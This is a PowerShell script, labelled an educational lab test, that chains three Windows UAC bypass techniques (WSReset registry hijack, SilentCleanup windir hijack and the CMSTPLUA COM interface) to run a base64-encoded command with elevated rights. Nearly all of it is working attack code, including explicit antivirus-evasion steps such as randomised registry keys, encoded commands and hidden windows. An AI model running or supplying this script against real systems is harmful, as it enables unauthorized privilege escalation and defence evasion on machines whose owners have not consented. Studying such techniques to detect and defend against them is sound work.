# ===========================================
# UAC Bypass Lab Test Script (Educational)
# Includes WSReset, SilentCleanup, CMSTPLUA
# Author: HB47x
# ===========================================
param (
   [string]$Command = "cmd.exe /c start cmd.exe" # Default command
)
Write-Host "======== UAC Bypass Lab Script ========" -ForegroundColor Cyan
# Validate command
if (-not (Test-Path $Command -ErrorAction SilentlyContinue) -and $Command -notmatch "^cmd\.exe|^powershell\.exe") {
   Write-Host "[-] Invalid command specified: $Command. Defaulting to cmd.exe." -ForegroundColor Red
   $Command = "cmd.exe /c start cmd.exe"
}
# Get Windows version and build
$os = Get-CimInstance Win32_OperatingSystem
$osVersion = $os.Version
$osBuild = $os.BuildNumber
Write-Host "[*] Detected Windows version: $osVersion (Build $osBuild)" -ForegroundColor Yellow
# Generate random key for AV evasion
$randomKey = [guid]::NewGuid().ToString().Replace("-", "").Substring(0, 8)
$obfuscatedRegPath = "HKCU:\Software\Classes\$randomKey"
# Precompute encoded command once
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
# Initialize results tracking
$Results = @{}
# -------------------------------------------
# 1. WSReset Bypass
# -------------------------------------------
Write-Host "[*] Attempting WSReset bypass..." -ForegroundColor Cyan
try {
   if ($osBuild -ge 18362) {
       New-Item -Path "$obfuscatedRegPath\Shell\open\command" -Force | Out-Null
       Set-ItemProperty -Path "$obfuscatedRegPath\Shell\open\command" -Name "DelegateExecute" -Value "" -ErrorAction Stop
       Set-ItemProperty -Path "$obfuscatedRegPath\Shell\open\command" -Name "(Default)" -Value "powershell.exe -EncodedCommand $encodedCommand" -ErrorAction Stop
       Start-Process -FilePath "$env:SystemRoot\System32\WSReset.exe" -WindowStyle Hidden -ErrorAction Stop
       Start-Sleep -Seconds 3
       Write-Host "[+] WSReset bypass executed successfully." -ForegroundColor Green
       $Results["WSReset"] = "Success"
   } else {
       Write-Host "[-] WSReset bypass not supported on this Windows version." -ForegroundColor Red
       $Results["WSReset"] = "Unsupported"
   }
} catch {
   Write-Host "[-] WSReset bypass failed: $_" -ForegroundColor Red
   $Results["WSReset"] = "Failed"
} finally {
   Remove-Item -Path $obfuscatedRegPath -Recurse -Force -ErrorAction SilentlyContinue
}
# -------------------------------------------
# 2. SilentCleanup Bypass
# -------------------------------------------
Write-Host "[*] Attempting SilentCleanup bypass..." -ForegroundColor Cyan
try {
   if ($osBuild -ge 18362) {
       Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "$env:Temp\$randomKey.exe /c powershell.exe -EncodedCommand $encodedCommand && set windir=$env:SystemRoot && " -ErrorAction Stop
       Start-Process -FilePath "schtasks.exe" -ArgumentList "/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I" -WindowStyle Hidden -ErrorAction Stop
       Start-Sleep -Seconds 3
       Write-Host "[+] SilentCleanup bypass executed successfully." -ForegroundColor Green
       $Results["SilentCleanup"] = "Success"
   } else {
       Write-Host "[-] SilentCleanup bypass not supported on this Windows version." -ForegroundColor Red
       $Results["SilentCleanup"] = "Unsupported"
   }
} catch {
   Write-Host "[-] SilentCleanup bypass failed: $_" -ForegroundColor Red
   $Results["SilentCleanup"] = "Failed"
} finally {
   Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir" -ErrorAction SilentlyContinue
}
# -------------------------------------------
# 3. CMSTPLUA COM Bypass
# -------------------------------------------
Write-Host "[*] Attempting CMSTPLUA COM bypass..." -ForegroundColor Cyan
try {
   if ($osBuild -ge 10240) {
       $clsid = "0D7E998F-5186-4D2B-8BFF-7E80B56E7E35"
       $funcName = "Func$randomKey"
       $comScript = @"
function $funcName {
   \$comObject = [activator]::CreateInstance([type]::GetTypeFromCLSID('$clsid'))
   \$comObject.ShellExec('powershell.exe', '-EncodedCommand $encodedCommand', 0, 7)
}
$funcName
"@
       $encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($comScript))
       Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedScript" -WindowStyle Hidden -ErrorAction Stop
       Start-Sleep -Seconds 3
       Write-Host "[+] CMSTPLUA bypass executed successfully." -ForegroundColor Green
       $Results["CMSTPLUA"] = "Success"
   } else {
       Write-Host "[-] CMSTPLUA bypass not supported on this Windows version." -ForegroundColor Red
       $Results["CMSTPLUA"] = "Unsupported"
   }
} catch {
   Write-Host "[-] CMSTPLUA bypass failed: $_" -ForegroundColor Red
   $Results["CMSTPLUA"] = "Failed"
}
# -------------------------------------------
# Summary
# -------------------------------------------
Write-Host "`n======== Bypass Summary ========" -ForegroundColor Cyan
foreach ($method in $Results.Keys) {
   $status = $Results[$method]
   Write-Host ("{0,-15}: {1}" -f $method, $status)
}
Write-Host "`n[*] All methods attempted. Check for elevated windows." -ForegroundColor Green